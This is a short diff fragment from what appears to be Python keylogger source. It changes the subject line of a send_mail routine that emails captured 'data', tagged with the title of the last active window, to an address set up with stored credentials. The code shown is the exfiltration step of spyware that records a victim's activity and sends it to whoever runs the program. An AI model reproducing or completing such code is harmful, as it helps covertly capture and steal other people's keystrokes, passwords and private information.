@@ -67,7 +67,7 @@ def send_mail():
             PASS = PAS
             FROM = FRM
             TO = FRM
-            SUBJECT = "ABSORBER"
+            SUBJECT = "LOGGER"
             MESSAGE =  '<span style="color:#0000FF">' + ' [' + lastwindow + '] ' + '</span>'+ data 
             msg = MIMEMultipart()
             msg.attach(MIMEText(MESSAGE, 'html'))
